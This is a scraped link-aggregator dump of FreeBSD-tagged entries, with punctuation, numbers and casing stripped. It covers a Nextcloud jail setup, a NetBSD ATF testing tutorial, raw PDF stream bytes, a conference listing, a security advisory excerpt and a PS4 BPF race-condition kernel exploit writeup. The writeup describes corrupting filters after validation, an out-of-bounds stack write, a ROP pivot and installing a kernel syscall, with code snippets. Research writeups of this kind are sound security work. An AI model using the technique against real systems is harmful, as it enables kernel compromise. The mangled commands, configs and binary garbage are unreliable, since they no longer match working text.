change editing pghbaconf using option authlocal authhost next time run initdb success start database server using usrlocalbinpgctl vardbpostgresdata l logfile start let start root nextcloud usrlocaletcrcdpostgresql start cest log could create socket address protocol supported cest log listening address port cest log listening unix socket cest log ending log output stderr cest hint future log output go log destination syslog root nextcloud sockstat user command pid fd proto local address foreign address postgres postgres root sshd ok working listening connection next connect create user database nextcloud server root nextcloud psql h nextcloudlocal u postgres psql fatal pghbaconf entry host user postgres database postgres ssl remmeber rule localhost jail localhost jail add address vardbpostgresdatapghbaconf file shown root nextcloud grep c vardbpostgresdatapghbaconf local connection host trust host trust let restart postgresql database root nextcloud usrlocaletcrcdpostgresql restart cest log could create socket address protocol supported cest log listening address port cest log listening unix socket cest log ending log output stderr cest hint future log output go log destination syslog connect create needed user database nextcloud installation root nextcloud psql h nextcloudlocal u postgres psql type help help postgres create user nextcloud password nextclouddbpassword create role postgres create database nextcloud template encoding unicode create database postgres alter database nextcloud owner nextcloud alter database postgres q root nextcloud also create daily maintenance script postgresql database root nextcloud cat vardbpostgresdatavacuumsh devnull usrlocalbinreindexdb devnull devnull usrlocalbinreindexdb devnull devnull eof root nextcloud chmod x vardbpostgresdatavacuumsh root nextcloud chown postgres postgres vardbpostgresdatavacuumsh let add cron job postgres user root nextcloud su postgres c crontab e line character crontab installing new crontab root nextcloud su postgres c crontab l vardbpostgresdatavacuumsh nginx webserver configure nginx let start creating self signed certificate want see warning certificate signed may want use service letsencryptorg example root nextcloud mkdir p usrlocaletcnginxssl root nextcloud cd usrlocaletcnginxssl root nextcloud usrlocaletcnginxssl openssl req node day newkey keyout nginxkey nginxcrt enter pas phrase serverkey nextcloudserverpassword asked enter information incorporated certificate request enter called distinguished name dn quite field leave blank field default value enter field left blank country name letter code au pl state province name full name somestate lodzkie locality name eg city lodz organization name eg company internet widgits pty ltd vermaden enterprise ltd organizational unit name eg section nextcloud departament common name eg server fqdn name nextcloudlocal email address vermaden nextcloudcom root nextcloud chmod usrlocaletcnginxsslnginxkey root nextcloud l l usrlocaletcnginxssl total rwr r root wheel apr nginxcrt rw root wheel apr nginxkey let tak care right nginx log file root nextcloud l l varlog grep nginx drwxrxrx root wheel apr nginx root nextcloud chown r www www varlognginx root nextcloud l l varlog grep nginx drwxrxrx www www apr nginx last least nginx main configuration file root nextcloud cat usrlocaletcnginxnginxconf user www workerprocesses workerrlimitnofile errorlog varlognginxerrorlog event workerconnections http include mimetypes defaulttype applicationoctetstream logformat main remoteaddr remoteuser timelocal request accesslog varlognginxaccesslog main sendfile keepalivetimeout upstream phphandler server unix varrunphpfpmsock server enforce http listen servername nextcloudlocal return http servername requesturi server listen ssl servername nextcloudlocal sslcertificate usrlocaletcnginxsslnginxcrt sslcertificatekey usrlocaletcnginxsslnginxkey header security related addheader stricttransportsecurity includesubdomains preload header addheader xcontenttypeoptions nosniff addheader xxssprotection modeblock addheader xrobotstag none addheader xdownloadoptions noopen addheader xpermittedcrossdomainpolicies none path root installation root usrlocalwwwnextcloud location robotstxt allow lognotfound accesslog location wellknowncarddav return scheme hostremotephpdav location wellknowncaldav return scheme hostremotephpdav buffer timeouts upload size clientmaxbodysize clientbodybuffersize sendtimeout enable gzip remove etag header gzip gzipvary gzipcomplevel gzipminlength gzipproxied expired nocache nostore private nolastmodified noetag auth gziptypes applicationatomxml applicationjavascript applicationjson applicationldjson applicationmanifestjson applicationrssxml applicationvndgeojson applicationvndmsfontobject applicationxfontttf applicationxwebappmanifestjson applicationxhtmlxml applicationxml fontopentype imagebmp imagesvgxml imagexicon textcachemanifest textcss textplain textvcard textvndrimlocationxloc textvtt textxcomponent textxcrossdomainpolicy location rewrite indexphp uri location deny location autotestoccissueindiedbconsole deny location indexremotepubliccroncoreajaxupdatestatusocsv updaterocsprovider php fastcgisplitpathinfo php include fastcgiparams fastcgiparam scriptfilename documentroot fastcgiscriptname fastcgiparam pathinfo fastcgipathinfo fastcgiparam http fastcgiparam modheadersavailable true fastcgiparam frontcontrolleractive true fastcgipass phphandler fastcgiintercepterrors fastcgirequestbuffering fastcgikeepconn fastcgibuffers fastcgibuffersize fastcgibusybufferssize fastcgitempfilewritesize fastcgisendtimeout fastcgireadtimeout fastcgiconnecttimeout location updaterocsprovider tryfiles uri index indexphp adding cache control header j cs file make sure php block location cssjswoffsvggif tryfiles uri indexphp uri isargs args addheader cachecontrol public header security related intended duplicated one addheader stricttransportsecurity includesubdomains preload header addheader xcontenttypeoptions nosniff addheader xxssprotection modeblock addheader xrobotstag none addheader xdownloadoptions noopen addheader xpermittedcrossdomainpolicies none optional dont log access asset accesslog location pnghtmlttficojpgjpeg tryfiles uri indexphp uri isargs args optional dont log access asset accesslog point later would get following error browser problem nginx php phpfpm configuration bad gateway php configure php need first postgresql related setting root nextcloud cat extensionpgsqlso root nextcloud cat eof postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice eof root nextcloud cat extensionpgsqlso postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice root nextcloud cat extensionpdopgsqlso root nextcloud cat eof postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice eof root nextcloud cat extensionpdopgsqlso postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice let make sure phpfpm log file exists right owner root nextcloud varlogphpfpmlog root nextcloud chown www www varlogphpfpmlog modification needed usrlocaletcphpfpmconf file root nextcloud grep usrlocaletcphpfpmconf global pid runphpfpmpid includeusrlocaletcphpfpmd conf let create www profile phpfpm daemon root nextcloud cat usrlocaletcphpfpmdwwwconf www user www group www listen varrunphpfpmsock listenbacklog listenowner www listengroup www pm static pmmaxchildren pmstartservers pmminspareservers pmmaxspareservers pmprocessidletimeout pmmaxrequests requestterminatetimeout rlimitfiles env hostname hostname env path usrlocalbin usrbin bin env tmp tmp env tmpdir tmp env temp tmp main php usrlocaletcphpini configuration file root nextcloud cat usrlocaletcphpini php engine shortopentag precision outputbuffering zliboutputcompression implicitflush unserializecallbackfunc serializeprecision disablefunctions disableclasses zendenablegc exposephp maxexecutiontime maxinputtime memorylimit errorreporting eall edeprecated estrict displayerrors displaystartuperrors logerrors logerrorsmaxlen ignorerepeatederrors ignorerepeatedsource reportmemleaks trackerrors htmlerrors errorlog varlogphplog variablesorder gpcs requestorder gp registerargcargv autoglobalsjit postmaxsize autoprependfile autoappendfile defaultmimetype texthtml defaultcharset docroot userdir enabledl fileuploads uploadmaxfilesize maxfileuploads allowurlfopen allowurlinclude defaultsockettimeout cli server cliservercolor date datetimezone europewarsaw filter iconv intl pcre pdo pdomysql pdomysqlcachesize pdomysqldefaultsocket phar mail function smtp localhost smtpport mailaddxheader sql sqlsafemode odbc odbcallowpersistent odbccheckpersistent odbcmaxpersistent odbcmaxlinks odbcdefaultlrl odbcdefaultbinmode interbase ibaseallowpersistent ibasemaxpersistent ibasemaxlinks ibasetimestampformat h ibasedateformat ibasetimeformat h mysqli mysqlimaxpersistent mysqliallowpersistent mysqlimaxlinks mysqlicachesize mysqlidefaultport mysqlidefaultsocket mysqlidefaulthost mysqlidefaultuser mysqlidefaultpw mysqlireconnect mysqlnd mysqlndcollectstatistics mysqlndcollectmemorystatistics postgresql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice bcmath bcmathscale browscap session sessionsavehandler file sessionsavepath tmp sessionusestrictmode sessionusecookies sessionuseonlycookies sessionname phpsessid sessionautostart sessioncookielifetime sessioncookiepath sessioncookiedomain sessioncookiehttponly sessionserializehandler php sessiongcprobability sessiongcdivisor sessiongcmaxlifetime sessionreferercheck sessioncachelimiter nocache sessioncacheexpire sessionusetranssid sessionhashfunction sessionhashbitspercharacter urlrewritertags ahref areahref framesrc inputsrc formfakeentry assertion zendassertions com mbstring gd exif tidy tidycleanoutput soap soapwsdlcachedir tmp soapwsdlcachelimit sysvshm ldap ldapmaxlinks mcrypt dba opcache curl openssl daemon enable daemon start final etcrcconf file root nextcloud cat etcrcconf daemon yes syslogdflags sshdenableyes postgresqlenableyes postgresqlclasspostgres postgresqldatavardbpostgresdata phpfpmenableyes memcachedenableyes memcachedflags l nginxenableyes daemon sendmailenablenone sendmailsubmitenableno sendmailoutboundenableno sendmailmspqueueenableno cleartmpenableyes cleartmpxyes extranetfstypesnfs dumpdevno updatemotdno keyratefast let start service memcached root nextcloud usrlocaletcrcdmemcached start starting memcached php phpfpm daemon root nextcloud usrlocaletcrcdphpfpm start performing sanity check phpfpm configuration notice configuration file usrlocaletcphpfpmconf test successful starting phpfpm postgresql database sohuld running already root nextcloud usrlocaletcrcdpostgresql status pgctl server running pid usrlocalbinpostgres vardbpostgresdata nginx webserver root nextcloud usrlocaletcrcdnginx start performing sanity check nginx configuration nginx configuration file usrlocaletcnginxnginxconf syntax ok nginx configuration file usrlocaletcnginxnginxconf test successful starting nginx let see daemon listening port root nextcloud sockstat user command pid fd proto local address foreign address www nginx www nginx www nginx www nginx www nginx www nginx www nginx www nginx root nginx root nginx nobody memcached postgres postgres root sshd remember phpfpm daemon us varrunphpfpmsock socket root nextcloud l l varrunphpfpmsock srwrw www www apr varrunphpfpmsock nextcloud let prepare directory nextcloud data root nextcloud mkdir p vardbnextclouddata root nextcloud chown r www www vardbnextcloud also need make sure whole nextcloud installation directory owned www user root nextcloud chown r www www usrlocalwwwnextcloud able access nextcloud using browser let type http nextcloudlocal host browser choice viola alive last configuration bit etered directly browser admin user admin admin pas nextcloudadminpassword data folder vardbnextclouddata database user nextcloud database pas nextclouddbpassword database name nextcloud database host nextcloudlocal look browser click finish setup button see nextcloud welcome message shown may close message see file nextcloud setting page yelds lack cache daemon let configure memcached daemon nextcloud configuration file added line usrlocalwwwnextcloudconfigconfigphp file root nextcloud usrlocalwwwnextcloudconfig diff u configphporg configphp configphporg configphp dbuser nextcloud dbpassword installed true memcachelocal ocmemcachememcached memcachedistributed ocmemcachememcached memcachedservers array array nextcloudlocal complete nextcloud main configuration file usrlocalwwwnextcloudconfigconfigphp change root nextcloud cat usrlocalwwwnextcloudconfigconfigphp passwordsalt secret trusteddomains array nextcloudlocal datadirectory vardbnextclouddata overwritecliurl http nextcloudlocal dbtype pgsql version dbname nextcloud dbhost nextcloudlocal dbport dbtableprefix oc dbuser nextcloud dbpassword installed true memcachelocal ocmemcachememcached memcachedistributed ocmemcachememcached memcachedservers array array nextcloudlocal alternatively may want get config directly nextcloud application using occ command root nextcloud sudo u www php usrlocalwwwnextcloudocc config list system system instanceid removed sensitive value passwordsalt removed sensitive value secret removed sensitive value trusteddomains nextcloudlocal datadirectory removed sensitive value overwritecliurl http nextcloudlocal dbtype pgsql version dbname removed sensitive value dbhost removed sensitive value dbport dbtableprefix oc dbuser removed sensitive value dbpassword removed sensitive value installed true memcachelocal ocmemcachememcached memcachedistributed ocmemcachememcached memcachedservers nextcloudlocal log end filled varlog directory ton log need configure rotation line add etcnewsyslogconf file root nextcloud cat etcnewsyslogconf eof vardbnextclouddatanextcloudlog www www jc varlogphpfpmlog www www jc varlognginxerrorlog www www jc varlognginxaccesslog www www jc eof let verify rotation root nextcloud newsyslog v tail vardbnextclouddatanextcloudlog trim fri jul varlogphpfpmlog trim fri jul varlognginxerrorlog trim fri jul varlognginxaccesslog trim fri jul yep work like charm cleanup optional may remove needed part jail example downloaded package distfiles root nextcloud rm rf varcachepkg root nextcloud rm rf usrportsobj root nextcloud rm rf usrportsdistfiles root nextcloud pkg autoremove checking integrity done conflicting deinstallation requested following package installed package removed number package removed operation free mib proceed deinstalling package yn reached end good luck nextcloud setup update sysv ipc jail since freebsd freebsd allowsysvipc jail parameter etcjailconf deprecated favor sysvmsgsysvsemsysvshm parameter information available man jail manual page example host man jail allowsysvipc process within jail access system v ipc primitive deprecated favor per module parameter see parameter set equivalent setting sysvmsg sysvsem sysvshm inherit change problem sysv ipc call postgresql server user postgres need different uid jail running host jail postgres user uid everything work like charm described broadly blog post postgres freebsd jail http using newer approach change configuration etcjailconf file host diff u etcjailconfold etcjailconf etcjailconfold etcjailconf execclean mountdevfs allowrawsockets allowsysvipc sysvsem new sysvshm new sysvmsg new whole etcjailconf file modification host cat etcjailconf nextcloud hosthostname nextcloudlocal interface path jailnextcloud execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets sysvsem new sysvshm new sysvmsg new update setup without socket run setup without socket may want modify php phpfpm daemon listen address instead using varrunphpfpmsock socket communication change usrlocaletcphpfpmdwwwconf phprpm profile nginx webserver main configuration usrlocaletcnginxnginxconf file root nextcloud diff u usrlocaletcphpfpmdwwwconfsocket usrlocaletcphpfpmdwwwconf usrlocaletcphpfpmdwwwconfsocket usrlocaletcphpfpmdwwwconf www user www group www listen varrunphpfpmsock listen listenallowedclients listenbacklog listenowner www listengroup www root nextcloud diff u usrlocaletcnginxnginxconfsocket usrlocaletcnginxnginxconf usrlocaletcnginxnginxconfsocket usrlocaletcnginxnginxconf keepalivetimeout upstream phphandler server unix varrunphpfpmsock server server update nextcloud update update latest nextcloud setup broken symptom login page keep redirecting fix described usrportsupdating file message fix affect user wwwnextcloud author brnrd freebsdorg update path apps bundled package changed apps appspkg must add entry appspaths array configconfigphp nextcloud installation patch default installation applied cd usrlocalwwwnextcloud su www c php occ config import usrlocalsharenextcloudfixappspathsjson fix installation eventual upgrade instruction need executed jail root nextcloud su www c php usrlocalwwwnextcloudocc config import usrlocalsharenextcloudfixappspathsjson hope help resolve issue update nextcloud freebsd article featured bsd zfs user conf episode thanks mentioning eof like like loading related
398,Lobsters,freebsd,FreeBSD,How to write ATF tests for NetBSD,https://r3xnation.wordpress.com/2018/04/10/how-to-write-atf-tests-for-netbsd/,write atf test netbsd,intro man page man page man page let start basic atfrun atfreport atfinittestcases function basic test structure look like test function head atfset test function body atfcheck note let explore deeper command important thing keep mind regarding command exit code stdout option e stderr option adding test program note run run file without atffile directory additional check adding architecture check good link link couple test wrote like,recently started contributing amazing netbsd foundation thinking trying new o long time switching netbsd o fun change first contribution netbsd foundation adding regression test address sanitizer asan automated testing framework atf netbsd managed complete help really amazing mentor kamil post gon na atf framework netbsd add multiple test ease intro atf test basically talking test program suite test case specific application program atf suite command variety command atf suite offer include atfcheck versatile command vital part checking process man page atfrun command used run test program man page atffail report failure test case atfreport used pretty print atfrun man page atfset set atf test condition taking better look syntax usage later let start basic atf testing framework come preinstalled default netbsd installation used write test various application command netbsd one write test program either c language shell script post dealing bash part take look source code test directory test netbsd system compiled test reside usrtests command run test atfrun combine atfreport provide pretty neat test result format try running atfrun atfreport netbsd installation need usrtests directory since file name specified us atffile find test run also run individual test atfrun atfreport keep mind need directory testfile basic structure test file atfinittestcases function function test case going tested test need added atfaddtestcase test case need head body defined two separate function namely head body basic test structure look like atftestcase foo foohead foobody atfinittestcases atfaddtestcase foo test function head head mainly used hold description test case list required program command atfset used set field example test case name foo requires echo command atftestcase foo foohead atfset decsr sample test atfset requireprogs echo test function body add test check result satisfaction also add preliminary check want important useful function atfcheck command used check result function need run note keep mind atfcheck three flag denote exit code stdout e stderr process run look later sample body foo program saw earlier assume foo trying check cat command working fine foobody echo check newtxt atfcheck e ignore match check cat newtxt echo check file used cat print output stdout check output let explore deeper atfcheck command previous function checked whether command exited returning also ignored stderr buffer tried match stdout buffer check string file important thing keep mind regarding command exit code used match exit code function hence writing c cpp test make sure include exit end additionally check different exit value also check signal add exit want exit code equal given value stdout option use inline text match text string stdout match regex used match regular expression stdout ignore used ignore whatever stderr option pretty much additionally test command may lead error saying test case exited nonokay exit code permitted able find good reason statement necessary avoid check part refer manual page get better idea work provided link adding test program first need create sh file test directory src add required test case use format given help finished feel need test file without building whole distribution copy file netbsd distribution usrtests note run atfrun file without atffile directory test test program use atfrun atfreport fix error bug etc done need modify makefile directory preference test directory src typical makefile look like include testsdir testsbase testssh testssh tfoo testssh tyournexttest include example makefile test tfoo test file usually named last change need make add name file distribsetsliststests use previous name assist adding part please keep mind devs prefer test alphabetical order added test check everything proper building distribution buildsh distribution additional check adding architecture check test file ready want test run couple architecture adding architecture check testcases boring timeconsuming add one inittestcases function look support n testtarget uname grep q support fi uname grep q support fi atftestcase targetnotsupported targetnotsupportedhead atfset descr test forced skip targetnotsupportedbody atfskip target supported atfinittestcases testtarget test support n atfaddtestcase targetnotsupported return test guess cover important thing cover good link link couple test wrote like like loading related
399,Lobsters,freebsd,FreeBSD,"Towards a Verified, Complex, Protocol Stack in a Production Kernel: Method and Demo (2016)",https://www.cs.dartmouth.edu/~trdata/reports/TR2016-803.pdf,towards verified complex protocol stack production kernel method demo,,obj length filter flatedecode stream r endstream endobj obj length filter flatedecode stream 㭲jxu pd j p rw endstream endobj obj length filter flatedecode stream b endstream endobj obj length filter flatedecode stream v gn ˀ g mu endstream endobj obj length filter flatedecode stream օy endstream endobj obj length filter flatedecode stream j h endstream endobj obj length filter flatedecode stream l dl e endstream endobj obj length filter flatedecode stream xu l cm p ӥ p q kʁ j p endstream endobj obj length filter flatedecode stream ά q l z v r c k
401,Lobsters,freebsd,FreeBSD,BSDCan 2018 schedule,http://www.bsdcan.org/2018/schedule/,bsdcan schedule,bsdcan,bsdcan technical bsd conference
402,Lobsters,freebsd,FreeBSD,Update PS4 4.55 BPF Race Condition Kernel Exploit Writeup,https://github.com/Cryptogenic/Exploit-Writeups/blob/master/FreeBSD/PS4%204.55%20BPF%20Race%20Condition%20Kernel%20Exploit%20Writeup.md,update bpf race condition kernel exploit writeup,note bug primarily interesting exploitation bug also potentially exploited unpatched platform using freebsd attacker readwrite permission devbpf want escalate root user kernel code execution published freebsd folder folder introduction throwback src freebsd sony fault race condition packet filter kernel outofbounds write primitive src race replace setting filter freebsd man page src src lack ownership src src src freeing filter src setting valid program src src src setting invalid program src creating binding device setting filter parallel triggering code execution installing kexec syscall src sony patch conclusion credit qwertyoruiopz reference watson freebsd kernel cross reference microsoft support description race condition deadlock,note bug primarily interesting exploitation bug also potentially exploited unpatched platform using freebsd attacker readwrite permission devbpf want escalate root user kernel code execution published freebsd folder folder introduction welcome kernel portion full exploit chain writeup bug found qwerty fairly unique way exploited wanted detailed writeup worked full source exploit found previously covered webkit exploit implementation userland access throwback read kernel exploit writeup may noticed left managed dump kernel obtaining code execution also left target object used cdev object target object indeed bpfd time exploit involving bpf public ommited writeup rewrote exploit use entirely different object turned better cdev turned stable anyways bpf nice target object contain function pointer jumpstart code execution also method obtaining arbitrary read primitive detail entirely needed helpful way nt write dumper code later section relevant exploit keep brief feel free skip section care bpfd object field related slot storing data since section tidbit older exploit include field relevant section src struct bpfd caddrt bdhbuf hold slot offset int bdhlen current length hold buffer offset int bdbufsize absolute length buffer offset slot used hold information get sent back someone would read bpf file descriptor setting offset bdhbuf address location want dump bdhlen bdbufsize respectively size choose dump entire kernel chose obtain arbitrary kernel read primitive via read system call bpf file descriptor easily dump kernel memory freebsd sony fault interestingly bug actually freebsd bug least directly introduced sony code freebsd bug however useful system devbpf device driver rootowned permission set meaning owner readwrite privilege nobody else though used escalating root kernel mode code execution however let take look makedev call inside kernel devbpf taken kernel dump lea rdi lea abpf bpf mov esi mov edx xor ecx ecx mov xor eax eax mov c call makedev see uid uid root user getting moved register argument owner argument however permission bit set octal mean anyone open devbpf readwrite privilege sure case qwerty speculates perhaps bpf used lan gaming case poor design decision bpf usually considered privileged accessible process completely untrusted webkit platform permission devbpf set race condition class bug abused exploit known race condition get bug specific important reader understand race condition issue especially something like kernel often complex software kernel resource shared global mean thread could potentially execute code access resource could accessed another thread point time happens one thread access resource another thread without exclusive access race condition introduced race condition defined possible scenario event happen sequence different developer intended lead undefined behavior simple singlethreaded program issue execution linear complex program code running parallel however becomes real issue prevent problem atomic instruction locking mechanism introduced one thread want access critical resource attempt acquire lock another thread already using resource generally thread attempting acquire lock wait thread finished thread must release lock resource done failure could result deadlock locking mechanism mutexes introduced developer sometimes struggle use properly example piece shared data get validated processed processing data locked validation window validation locking data change developer think data validated could substituted something malicious validated used parallel programming difficult especially developer also want factor fact nt want put much code locking unlocking impact performance race condition see microsoft page packet filter since bug directly filter system important know basic packet filter filter essentially set pseudoinstructions parsed bpffilter pseudoinstruction set fairly minimal allows thing like perform basic arithmetic operation copy value around inside buffer breaking bpf vm entirety far beyond scope writeup know code produced ran kernel mode readwrite access devbpf privileged reference opcodes bpf vm take outofbounds write primitive take look storex mnemonic handler bpffilter see following code src mem bpfmemwords case bpfstx mem pc k x continue immediately interesting u exploit developer set pc k arbitrary value use establish outofbounds write primitive stack extremely helpful instance use corrupt return pointer stored stack bpffilter return start rop chain perfect trivial attack strategy implement also stable nt worry issue typically come classic stackheap smashing unfortunately instruction run validator trying set pc k way would outside boundary mem fail validation check malicious instruction could substituted postvalidation would time check time use toctou issue present race replace setting filter take look bpfioctl notice various command managing interface setting buffer property course setting readwrite filter list command found freebsd man page pas biosetwf command noted lowlevel notice bpfsetf called set filter given device src case biocsetf case biocsetfnr case biocsetwf ifdef case case case endif error bpfsetf struct bpfprogram addr cmd break look instruction copied kernel also see bpfvalidate run immediately meaning point specify pc k value allows outofbounds access src size flen sizeof fp bfinsns fcode struct bpfinsn malloc size mbpf mwaitok copyin caddrt fp bfinsns caddrt fcode size bpfvalidate fcode int flen lack ownership taken look code set filter let take look code us filter function bpfwrite called process call write system call valid bpf device see via following function table bpf backing cdevsw src static struct cdevsw bpfcdevsw dversion dversion dopen bpfopen dread bpfread dwrite bpfwrite dioctl bpfioctl dpoll bpfpoll dname bpf dkqfilter bpfkqfilter purpose bpfwrite allow user write packet interface packet passed bpfwrite pas write filter set interface set via ioctl detailed setting filter subsection first privilege check irrelevant untrusted process successfully write due everyone rw permission device set buffer calling bpfmovein src bzero dst sizeof dst null hlen error bpfmovein uio int bdbif bifdlt ifp dst hlen bdwfilter error bdwdcount return error bdwfcount let take look bpfmovein src mp mlen hlen error eperm goto bad error uiomove mtod uchar len uio error goto bad slen bpffilter wfilter mtod uchar len len slen error eperm goto bad notice absolutely locking present bpfmovein bpfwrite caller therefore bpffilter function executes given filter program device called unlocked state additionally bpffilter nt locking ownership maintained even obtained process executing write filter would happen filter free validated via bpfsetf setting filter reallocated invalid instruction filter executing racing three thread one setting valid nonmalicious filter one setting invalid malicious filter one trying continously write bpf possible exploitable scenario valid instruction replaced invalid instruction influence pc k write outofbounds stack freeing filter need method able free filter another thread still running trigger useafterfree situation looking bpfsetf notice allocating new buffer filter instruction first check old one destroy src static int bpfsetf struct bpfd struct bpfprogram fp ulong cmd struct bpfinsn fcode old cmd biocsetwf old bdwfilter wfilter else wfilter old bdrfilter old null free caddrt old mbpf fcode struct bpfinsn malloc size mbpf mwaitok wfilter bdwfilter fcode else bdrfilter fcode cmd biocsetf resetd bpffilter copy bdwfilter free one thread replace filter second thread also use pointer free resulting useafterfree thread attempting set invalid filter effectively end spraying heap result eventually get allocated address three thread following continously set filter valid instruction passing validation check continously set another filter invalid instruction freeing replacing old instruction new one malicious one continously write bpf eventually valid filter corrupted invalid one postvalidation write use resulting memory corruption specially crafted instruction used overwrite return address stack obtain code execution kernel mode setting valid program firstly need setup bpfprogram object pas ioctl setting filter structure bpfprogram src struct bpfprogram size uint bflen struct bpfinsn bfinsns important note bflen size program instruction byte rather length mean value specify bflen total size instruction memory divided size instruction eight src struct bpfinsn size ushort code uchar jt uchar jf k valid program easy write simply write bunch nop operation psueodinstructions return pseudoinstruction end looking bpfh determine opcodes use nop ret respectively src define bpfld specifying args effectively nothing define bpfret code snippet exploit implemented j rop chain setup valid bpf program memory setup valid program var bpfvalidprog malloc var bpfvalidinstructions malloc bpfvalidinstructions setting invalid program program want write malicious code corrupt memory stack executed via write program almost simple valid program contains psuedoinstructions abuse ldx stx instruction write data stack first loading value want load index register storing index register index scratch memory however due instruction invalid actually write outofbounds corrupt function return pointer outline instruction want run malicious filter ldx x lower stack pivot gadget address pop rsp stx x ldx x upper stack pivot gadget address pop rsp stx x ldx x lower kernel rop chain fake stack address stx x ldx x upper kernel rop chain fake stack address stx x ret note type mem type reason writes increasing instead let take look mem full definition src define bpfmemwords mem bpfmemwords notice buffer allocated byte value byte per value instruction accessing index obviously way bound buffer filter substituted postvalidation nothing catch thus oob write born index location stack return address overwriting address pop rsp ret gadget writing value want pop rsp register index successfully pivot stack fake stack kernel rop chain obtain code execution code snippet exploit setup invalid malicious bpf program memory setup invalid program var entry windowgadgets pop rsp var bpfinvalidprog malloc var bpfinvalidinstructions malloc entrylow entryhi kchainstacklow kchainstackhi bpfinvalidinstructions creating binding device setup corruption portion race need open two instance devbpf bind valid interface interface bind matter depending system connected network wired ethernet connection want bind interface connected via wifi want bind interface exploit automatically determines interface use performing test test essentially attempt write given interface invalid write fail return occurs binding interface exploit attempt rebind check write return exploit bail report failed bind device open first device bind var psyscall sysopen stringify devbpf permission open ordwr psyscall sysioctl stringify biocsetif psyscall syswrite spadp low psyscall sysioctl stringify psyscall syswrite spadp low throw failed bind first devbpf device process repeated second device setting filter parallel cause memory corruption need two thread running parallel continously set filter device eventually valid filter free reallocated corrupted invalid filter thread essentially following pseudocode biocsetwf void threadone set valid program ioctl bpfvalidprogram void threadtwo set invalid program ioctl bpfinvalidprogram triggering code execution corrupt filter substitute invalid instruction need filter actually get ran trigger code execution via corrupted return address since setting write filter bpfwrite perfect candidate mean need third thread run constantly write first bpf device filter eventually get corrupted next write run invalid filter causing stack memory corrupted jump address specify allowing u fairly trivially obtain code execution void threadthree try trigger code execution void scratch void malloc n write scratch n break installing kexec syscall ultimate goal krop chain install custom system call execute code kernel mode keep thing consistent use syscall signature syscall follows syskexec void code void uap fairly trivial add entry sysent table entry sysent table follows structure src struct sysent system call table int synarg number argument sycallt sycall implementing function aueventt syauevent audit event associated syscall systraceargsfunct sysystraceargsfunc optional argument conversion function syentry dtrace entry id systrace syreturn dtrace return id systrace syflags general flag system call sythrcnt main point interest synarg sycall want set synarg one address execute second passing argument sycall member want set gadget jmp rsi register since address code execute passed rdi remember first argument normally passed rdi register syscalls rdi occupied thread descriptor td jmp qword ptr rsi gadget need found kernel offset load ff jmp qword ptr rsi kernel dump see offset sysent entry syscall see implementing function nosys perfectly fine overwrite dq syscall dq offset nosys dq dq dq dq writing kernel base want change flag sythrabsent sythrstatic successfully insert custom system call execute code given kernel mode sony patch section header lie sony nt actually patch issue however know something wonky going bpf crash dump accidentally made sony server kernel panic via simple stack trace determined return address bpfwrite corrupted sony could nt seem figure decided strip bpfwrite kernel entirely sonyway luckily many hour searching seems useful primitive leverage filter corruption bug sadly dead prepatch bpf cdevsw bpfdevsw dd dversion data xref dd dflags dq dname dq dopen dq dfdopen dq dclose dq dread dq dwrite dq dioctl dq dpoll dq dmmap dq dstrategy dq ddump dq dkqfilter dq dpurge dq dmmapsingle dd dd dup dq ddevs dd dq gianttrick dq postfreelist postpatch bpf cdevsw bpfdevsw dd dversion data xref dd dflags dq dname dq dopen dq dfdopen dq dclose dq dread dq dwrite dq dioctl dq dpoll dq dmmap dq dstrategy dq ddump dq dkqfilter dq dpurge dq dmmapsingle dd dd dup dq ddevs dd dq gianttrick dq postfreelist notice data dwrite longer valid function pointer conclusion pretty cool bug exploit writeup bug incredibly helpful system exploited unprivileged user still valid method going root code execution thought would cool bug writeup plus love writing anyway attack strategy fairly unique using race condition trigger outofbounds write stack also fairly trivial exploit implement strategy overwriting return pointer stack easy method learning security researcher understand also highlight attack strategy may old perhaps one oldest still applied modern exploitation slight variation credit qwertyoruiopz reference watson freebsd kernel cross reference microsoft support description race condition deadlock
403,Lobsters,freebsd,FreeBSD,AsiaBSDCon 2018,http://www.youtube.com/playlist?list=PLnTFqpZk5ebDZwT-bmYcIwv76yhmTfl0l,asiabsdcon,,
404,Lobsters,freebsd,FreeBSD,FreeBSD Security Advisory ,https://www.freebsd.org/security/advisories/FreeBSD-SA-18:03.speculative_execution.asc,freebsd security advisory,,begin pgp signed message hash security advisory freebsd project topic speculative execution vulnerability category core module kernel announced credit jann horn google project zero werner haas thomas prescher cyberus technology daniel grus moritz lipp stefan mangard michael schwarz graz university technology paul kocher daniel genkin university pennsylvania university maryland mike hamburg rambus yuval yarom university adelaide affect supported version freebsd corrected utc utc cve name special note speculative execution vulnerability mitigation work progress advisory address significant issue freebsd cpu expect update advisory include cpu future freebsd release address issue cpu freebsdupdate include change part update due common code change shared however contains functional change particular mitigate issue general information regarding freebsd security advisory including description field security branch following section please visit background many modern processor implementation issue allow unprivileged attacker bypass userkernel interprocess memory access restriction exploiting speculative execution shared resource example cache ii problem description number issue relating speculative execution found last year publicly announced january two known meltdown spectre addressed meltdown issue relies affected cpu speculatively executing instruction beyond faulting instruction happens change architectural state committed observable change may left micro architectural state example cache may used infer privileged data spectre spectre us branch target injection speculatively execute kernel code address control attacker iii impact attacker may able read secret data kernel process executing untrusted code example web browser iv workaround workaround available v solution perform one following upgrade vulnerable system supported freebsd stable release security branch releng dated correction date reboot update vulnerable system via binary patch system running release version freebsd platform updated via freebsdupdate utility followed reboot new kernel freebsdupdate fetch freebsdupdate install shutdown r update vulnerable system via source code patch following patch verified apply applicable freebsd release branch download relevant patch location verify detached pgp signature using pgp utility freebsd fetch http fetch http gpg verify b apply patch execute following command root cd usrsrc patch pathtopatch c recompile kernel described reboot system vi correction detail meltdown mitigation known page table isolation pti pti largely separate kernel user mode page table even speculative execution kernel data unmapped accessible demonstration meltdown vulnerability available http githubcomdagerlingmeltdown positive result definitive vulnerability exists certainty negative result indicates either cpu affected test capable demonstrating issue cpu may need modified patched kernel automatically enable pti intel cpu status checked via vmpmappti 